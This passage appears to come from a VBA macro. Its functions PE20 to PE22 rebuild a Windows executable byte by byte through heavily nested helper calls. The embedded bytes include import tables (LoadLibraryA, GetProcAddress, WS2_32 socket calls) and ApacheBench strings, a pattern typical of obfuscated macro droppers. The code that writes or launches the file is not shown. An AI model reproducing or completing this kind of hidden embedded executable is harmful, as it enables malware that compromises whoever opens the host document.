    strPE = A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), " "), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), "?{"), 20), 174), "G"), 225), "z"), 132), "?"), 252), 169), 241), 210), "MbP?"), 0), 0), 0), 0), 0), 0), "P?"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 0), "@"), 143), "@"), 0), 0), 0), 0), 0), 0), 240), "?"), 0), 0), 0), 0), 0), 0), 0), 0), 141), 237), 181), 160), 247), 198), 176), ">"), 0), 0), 0), 0), 31), 0), 0), 0), ";"), 0), 0), 0), "Z"), 0), 0), 0), "x"), 0), 0), 0), 151), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 181), 0), 0), 0), 212), 0), 0), 0), 243), 0), 0), 0), 17), 1), 0), 0), "0"), 1), 0), 0), "N"), 1), 0), 0), "2"), 1), 0), 0), "Q"), 1), 0), 0), 0), 0), 0), 0), 31), 0), 0), 0), "="), 0), 0), 0), "\"), 0), 0), 0)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "z"), 0), 0), 0), 153), 0), 0), 0), 184), 0), 0), 0), 214), 0), 0), 0), 245), 0), 0), 0), 19), 1), 0), 0), "(null)"), 0), 0), "0123456789abcdef"), 0), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 0), 0), "0123456789ABCDEF"), 0), 0), 0), 0), "0123456789abcdef"), 0), 0), 0), 0), "01234567")
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "89ABCDEF"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "$@"), 0), 0), 0), 0), 0), 0), "$"), 192), 184), 30), 133), 235), "Q"), 184), 158), "?"), 154), 153), 153), 153), 153), 153), 185), "?"), 20), "'"), 0), 0), "<"), 249)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(strPE, "@"), 0), 25), "'"), 0), 0), ","), 249), "@"), 0), 29), "'"), 0), 0), 24), 249), "@"), 0), 30), "'"), 0), 0), 12), 249), "@"), 0), "&'"), 0), 0), 248), 248), "@"), 0), "('"), 0), 0), 224), 248), "@"), 0), "3'"), 0), 0), 200), 248), "@"), 0)
    strPE = B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "4'"), 0), 0), 172), 248), "@"), 0), "5'"), 0), 0), 140), 248), "@"), 0), "6'"), 0), 0), "l"), 248), "@"), 0), "7'"), 0), 0), "L"), 248), "@"), 0), "8'"), 0), 0), "8"), 248), "@"), 0), "9'"), 0), 0), 24), 248), "@"), 0), ":'")
    strPE = A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 4), 248), "@"), 0), ";'"), 0), 0), 236), 247), "@"), 0), "<'"), 0), 0), 208), 247), "@"), 0), "='"), 0), 0), 172), 247), "@"), 0), ">'"), 0), 0), 140), 247), "@"), 0), "?'"), 0), 0), "l"), 247), "@"), 0), "@'"), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "T"), 247), "@"), 0), "A'"), 0), 0), "4"), 247), "@"), 0), "B'"), 0), 0), "$"), 247), "@"), 0), "C'"), 0), 0), 12), 247), "@"), 0), "D'"), 0), 0), 244), 246), "@"), 0), "E'"), 0), 0), 208), 246), "@"), 0), "F'"), 0), 0), 180), 246)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "@"), 0), "G'"), 0), 0), 152), 246), "@"), 0), "H'"), 0), 0), "|"), 246), "@"), 0), "I'"), 0), 0), "d"), 246), "@"), 0), "J'"), 0), 0), "@"), 246), "@"), 0), "K'"), 0), 0), 28), 246), "@"), 0), "L'"), 0), 0), 4), 246), "@"), 0)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "M'"), 0), 0), 240), 245), "@"), 0), "N'"), 0), 0), 204), 245), "@"), 0), "O'"), 0), 0), 184), 245), "@"), 0), "P'"), 0), 0), 168), 245), "@"), 0), "Q'"), 0), 0), 148), 245), "@"), 0), "R'"), 0), 0), 128), 245), "@"), 0), "S'")
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "l"), 245), "@"), 0), "T'"), 0), 0), "\"), 245), "@"), 0), "U'"), 0), 0), "H"), 245), "@"), 0), "V'"), 0), 0), "0"), 245), "@"), 0), "W'"), 0), 0), 12), 245), "@"), 0), "k'"), 0), 0), 236), 244), "@"), 0), "l'"), 0), 0)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 204), 244), "@"), 0), "m'"), 0), 0), 176), 244), "@"), 0), "u'"), 0), 0), 144), 244), "@"), 0), 249), "*"), 0), 0), 128), 244), "@"), 0), 252), "*"), 0), 0), "\"), 244), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), "Jan"), 0), "Fe")
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "b"), 0), "Mar"), 0), "Apr"), 0), "May"), 0), "Jun"), 0), "Jul"), 0), "Aug"), 0), "Sep"), 0), "Oct"), 0), "Nov"), 0), "Dec"), 0), "Sun"), 0), "Mon"), 0)
    strPE = B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "Tue"), 0), "Wed"), 0), "Thu"), 0), "Fri"), 0), "Sat"), 0), "<"), 2), "A"), 0), "0"), 2), "A"), 0), "("), 2), "A"), 0), " "), 2), "A"), 0), 24), 2), "A"), 0), 12), 2), "A"), 0), "012345")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "6789"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 2), 0), 0), 2), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 1), 2), 1), 3), 3), 3), 3), 3), 3), 2), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 0), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 0), 3), 2), 1), 2), 2), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 3), 2), 3)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 3), 1), 3), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 3), 2), 3), 3), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@@@@@>@@@?456789:;<=@@@@@@@"), 0), 1), 2), 3), 4), 5), 6), 7), 8), 9), 10), 11), 12), 13), 14), 15), 16), 17), 18), 19), 20), 21), 22)
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 23), 24), 25), "@@@@@@"), 26), 27), 28), 29), 30), 31), " !"), 34), "#$%&'()*+,-./0123@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef")
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "ghijklmnopqrstuvwxyz0123456789+/"), 0), 0), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), "*"), 183), "@"), 0), ">"), 183)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 172), 200), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 30), 203), 0), 0), 200), 192), 0), 0), 240), 199), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "b"), 207), 0), 0), 12), 192), 0), 0), 228), 199), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 150), 207), 0), 0), 0), 192), 0), 0), 132), 201), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 164), 207), 0), 0), 160), 193), 0), 0), "x"), 201), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 196), 207), 0), 0), 148), 193)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 140), 207), 0), 0), "p"), 207), 0), 0), 0), 0), 0), 0), "R"), 207), 0), 0), "F"), 207), 0), 0), ":"), 207), 0), 0), "*"), 207), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 24), 207), 0), 0), 8), 207), 0), 0), 242), 206), 0), 0), 222), 206), 0), 0), 198), 206), 0), 0), 186), 206), 0), 0), 170), 206), 0), 0), 146), 206), 0), 0), "z"), 206), 0), 0), "^"), 206), 0), 0), "N"), 206), 0), 0), "@"), 206), 0), 0), 250), 203)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 10), 204), 0), 0), "$"), 204), 0), 0), ">"), 204), 0), 0), "L"), 204), 0), 0), "^"), 204), 0), 0), "j"), 204), 0), 0), "t"), 204), 0), 0), 134), 204), 0), 0), 154), 204), 0), 0), 178), 204), 0), 0), 192), 204), 0), 0), 218), 204), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 242), 204), 0), 0), 12), 205), 0), 0), "&"), 205), 0), 0), ">"), 205), 0), 0), "`"), 205), 0), 0), "h"), 205), 0), 0), "z"), 205), 0), 0), 138), 205), 0), 0), 160), 205), 0), 0), 176), 205), 0), 0), 192), 205), 0), 0), 210), 205), 0), 0), 224), 205)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 238), 205), 0), 0), 4), 206), 0), 0), 22), 206), 0), 0), "4"), 206), 0), 0), 0), 0), 0), 0), 196), 201), 0), 0), 216), 203), 0), 0), 198), 203), 0), 0), 184), 203), 0), 0), 168), 203), 0), 0), 152), 203), 0), 0), 132), 203), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "x"), 203), 0), 0), "h"), 203), 0), 0), "X"), 203), 0), 0), "J"), 203), 0), 0), "B"), 203), 0), 0), "8"), 203), 0), 0), "*"), 203), 0), 0), 20), 203), 0), 0), 10), 203), 0), 0), 0), 203), 0), 0), 246), 202), 0), 0), 236), 202), 0), 0), 224), 202)

    PE20 = strPE
End Function

Private Function PE21() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 216), 202), 0), 0), 206), 202), 0), 0), 196), 202), 0), 0), 180), 202), 0), 0), 164), 202), 0), 0), 154), 202), 0), 0), 146), 202), 0), 0), 136), 202), 0), 0), "~"), 202), 0), 0), "t"), 202), 0), 0), "l"), 202), 0), 0), "d"), 202), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "\"), 202), 0), 0), "R"), 202), 0), 0), "H"), 202), 0), 0), ">"), 202), 0), 0), "4"), 202), 0), 0), "*"), 202), 0), 0), " "), 202), 0), 0), 22), 202), 0), 0), 10), 202), 0), 0), 2), 202), 0), 0), 250), 201), 0), 0), 234), 201), 0), 0), 224), 201)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 214), 201), 0), 0), 204), 201), 0), 0), 236), 203), 0), 0), 220), 207), 0), 0), 208), 207), 0), 0), 0), 0), 0), 0), 186), 207), 0), 0), 176), 207), 0), 0), 0), 0), 0), 0), 7), 0), 0), 128), 4), 0), 0), 128), 9), 0), 0), 128)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "4"), 0), 0), 128), 14), 0), 0), 128), 12), 0), 0), 128), 21), 0), 0), 128), 23), 0), 0), 128), 3), 0), 0), 128), 18), 0), 0), 128), 10), 0), 0), 128), 151), 0), 0), 128), "s"), 0), 0), 128), "t"), 0), 0), 128), "o"), 0), 0), 128), 0), 0)
    strPE = B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 19), 1), "_iob"), 0), 0), "X"), 2), "fprintf"), 0), 183), 2), "strchr"), 0), 0), 142), 1), "_pctype"), 0), "a"), 0), "__mb_cur")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(strPE, "_max"), 0), 0), "I"), 2), "exit"), 0), 0), "="), 2), "atoi"), 0), 0), 21), 1), "_isctype"), 0), 0), 158), 2), "printf"), 0), 0), 175), 2), "sign")
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "al"), 0), 0), 145), 2), "malloc"), 0), 0), "@"), 2), "calloc"), 0), 0), "O"), 2), "fflush"), 0), 0), "L"), 2), "fclose"), 0), 0), 156), 2), "perr")
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "or"), 0), 0), "W"), 2), "fopen"), 0), 164), 2), "qsort"), 0), 241), 0), "_ftol"), 0), 193), 2), "strncpy"), 0), 197), 2), "strstr"), 0), 0), 192), 2)
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "strncmp"), 0), "^"), 2), "free"), 0), 0), 200), 0), "_errno"), 0), 0), "z"), 0), "__p__wenviron"), 0), "m"), 0), "__p__e")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "nviron"), 0), 0), 167), 2), "realloc"), 0), 196), 2), "strspn"), 0), 0), 155), 2), "modf"), 0), 0), 188), 2), "strerror"), 0), 0), 227), 2)
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "wcscpy"), 0), 0), 230), 2), "wcslen"), 0), 0), 179), 0), "_close"), 0), 0), 232), 2), "wcsncmp"), 0), 195), 2), "strrchr"), 0), "MS")
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "VCRT.dll"), 0), 0), "U"), 0), "__dllonexit"), 0), 134), 1), "_onexit"), 0), 211), 0), "_exit"), 0), "H"), 0), "_XcptF")
    strPE = A(B(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "ilter"), 0), "d"), 0), "__p___initenv"), 0), "X"), 0), "__getmainargs"), 0), 15), 1), "_initterm"), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 131), 0), "__setusermatherr"), 0), 0), 157), 0), "_adjust_fdiv"), 0), 0), "j"), 0), "__p__commode")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "o"), 0), "__p__fmode"), 0), 0), 129), 0), "__set_app_type"), 0), 0), 202), 0), "_except_handle")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "r3"), 0), 0), 183), 0), "_controlfp"), 0), 0), 29), 3), "SetLastError"), 0), 0), 238), 0), "FreeEnvironmen")
    strPE = A(A(B(A(A(A(A(B(A(B(A(B(strPE, "tStringsW"), 0), "O"), 1), "GetEnvironmentStringsW"), 0), 0), 245), 1), "GlobalFree"), 0), 0)
    strPE = B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 9), 1), "GetCommandLineW"), 0), "V"), 3), "TlsAlloc"), 0), 0), "W"), 3), "TlsFree"), 0), 140), 0), "Duplicat")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "eHandle"), 0), ":"), 1), "GetCurrentProcess"), 0), 26), 3), "SetHandleInformation")
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "."), 0), "CloseHandle"), 0), 192), 1), "GetSystemTimeAsFileTime"), 0), 188), 0), "FileTi")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "meToSystemTime"), 0), 0), 216), 1), "GetTimeZoneInformation"), 0), 0), 187), 0), "FileTi")
    strPE = B(A(B(A(A(B(A(B(A(B(strPE, "meToLocalFileTime"), 0), "N"), 3), "SystemTimeToFileTime"), 0), 0), "O"), 3), "System")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "TimeToTzSpecificLocalTime"), 0), "I"), 3), "Sleep"), 0), 234), 0), "FormatMessageA")
    strPE = B(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "i"), 1), "GetLastError"), 0), 0), 133), 3), "WaitForSingleObject"), 0), "I"), 0), "CreateEv")
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "entA"), 0), 0), ","), 3), "SetStdHandle"), 0), 0), 16), 3), "SetFilePointer"), 0), 0), "M"), 0), "CreateFi")
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(B(strPE, "leA"), 0), "P"), 0), "CreateFileW"), 0), 140), 1), "GetOverlappedResult"), 0), 131), 0), "DeviceIo")
    strPE = A(B(A(B(A(A(B(A(B(A(B(strPE, "Control"), 0), "Z"), 1), "GetFileInformationByHandle"), 0), 0), "R"), 2), "LocalFree"), 0)
    strPE = B(A(A(A(A(B(A(B(A(B(A(B(strPE, "^"), 1), "GetFileType"), 0), "Z"), 0), "CreateMutexA"), 0), 0), 25), 2), "InitializeCritical")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "Section"), 0), "z"), 0), "DeleteCriticalSection"), 0), 143), 0), "EnterCriticalSec")
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "tion"), 0), 0), 184), 2), "ReleaseMutex"), 0), 0), 11), 3), "SetEvent"), 0), 0), "G"), 2), "LeaveCriticalS")
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(B(strPE, "ection"), 0), 0), "Q"), 3), "TerminateProcess"), 0), 0), "R"), 1), "GetExitCodeProcess"), 0), 0)
    strPE = A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 223), 1), "GetVersionExA"), 0), 152), 1), "GetProcAddress"), 0), 0), "H"), 2), "LoadLibraryA"), 0), 0)
    strPE = B(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 151), 3), "WriteFile"), 0), 171), 2), "ReadFile"), 0), 0), 135), 2), "PeekNamedPipe"), 0), "KERNEL32.d")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "ll"), 0), 0), 29), 0), "AllocateAndInitializeSid"), 0), 0), 225), 0), "FreeSid"), 0), "ADVAPI32")
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, ".dll"), 0), 0), "WSOCK32.dll"), 0), "9"), 0), "WSASend"), 0), "4"), 0), "WSARecv"), 0), "WS2_32.dll"), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 197), 1), "_strnicmp"), 0), 191), 1), "_strdup"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 0), 0), "d"), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 128), 195), 201), 1), 0), 0), 0), 0), 224), 11), "A"), 0)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "2"), 0), 0), 0), "B"), 0), 0), 0), "K"), 0), 0), 0), "P"), 0), 0), 0), "Z"), 0), 0), 0), "_"), 0), 0), 0), "b"), 0), 0), 0), "c"), 0), 0), 0), "d"), 0), 0), 0), "%s: Cannot use")
    strPE = B(strPE, " concurrency level greater than total number of re")
    strPE = B(A(A(A(B(A(A(B(strPE, "quests"), 10), 0), "%s: Invalid Concurrency [Range 0..%d]"), 10), 0), 0), "%s")
    strPE = A(A(A(B(A(A(A(A(A(B(strPE, ": invalid URL"), 10), 0), 0), 0), 0), "%s: wrong number of arguments"), 10), 0), 0)
    strPE = B(A(A(A(B(A(B(A(B(strPE, "User-Agent:"), 0), "Accept:"), 0), "Host:"), 0), 0), 0), "Proxy-Authorization: B")
    strPE = B(A(A(B(A(B(strPE, "asic "), 0), "Proxy credentials too long"), 10), 0), "Authorization: B")
    strPE = B(A(A(A(A(A(B(A(A(A(B(strPE, "asic "), 0), 0), 0), "Authentication credentials too long"), 10), 0), 0), 0), 0), "Co")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "okie: "), 0), 0), 0), 0), 13), 10), 0), 0), "Cannot mix PUT and HEAD"), 10), 0), 0), 0), 0), "Cannot m")
    strPE = A(A(B(A(A(A(A(B(strPE, "ix POST and HEAD"), 10), 0), 0), 0), "Cannot mix POST/PUT and HEAD"), 10), 0)
    strPE = B(A(A(B(A(A(strPE, 0), 0), "Invalid number of requests"), 10), 0), "n:c:t:b:T:p:u:v:rkVh")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "wix:y:z:C:H:P:A:g:X:de:Sq"), 0), 0), 0), "bgcolor=white"), 0), 0), 0), "Total ")
    strPE = B(A(A(B(A(A(B(A(A(B(strPE, "of %d requests completed"), 10), 0), "%s"), 10), 0), "..done"), 10), 0), "Finished %d ")

    PE21 = strPE
End Function

Private Function PE22() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(strPE, "requests"), 10), 0), 0), 0), "apr_socket_connect()"), 0), 0), 0), 0), 10), "Test aborted ")
    strPE = B(A(A(A(B(A(A(A(A(A(A(B(strPE, "after 10 failures"), 10), 10), 0), 0), 0), 10), "Server timed out"), 10), 10), 0), "apr_poll")
    strPE = B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "apr_sockaddr_info_get() for %s"), 0), 0), "error creating")
    strPE = B(A(A(A(A(B(strPE, " request buffer: out of memory"), 10), 0), 0), 0), "INFO: %s header ")
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "== "), 10), "---"), 10), "%s"), 10), "---"), 10), 0), "Request too long"), 10), 0), 0), 0), "%s %s HTTP/1.0")
    strPE = A(A(B(A(A(B(A(A(B(A(A(strPE, 13), 10), "%s%s%sContent-length: %u"), 13), 10), "Content-type: %s"), 13), 10), "%s"), 13), 10)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "PUT"), 0), "POST"), 0), 0), 0), 0), "text/plain"), 0), 0), "%s %s HTTP/1.0"), 13), 10), "%s%s%s")
    strPE = B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "%s"), 13), 10), 0), 0), "HEAD"), 0), 0), 0), 0), "GET"), 0), "Connection: Keep-Alive"), 13), 10), 0), 0), 0), 0), "Acce")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "pt: */*"), 13), 10), 0), 0), 0), "User-Agent: ApacheBench/"), 0), 0), 0), 0), "2.3"), 0), "Host: ")
    strPE = A(B(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "apr_pollset_create failed"), 0), 0), 0), "(be patient)%s"), 0), 0), "..."), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 10), 0), 0), 0), "[through %s:%d] "), 0), 0), 0), 0), "Benchmarking %s "), 0), 0), 0), 0), "%s: %s")
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(strPE, " (%d)"), 10), 0), 0), 0), 0), "Send request failed!"), 10), 0), 0), 0), "Send request tim")
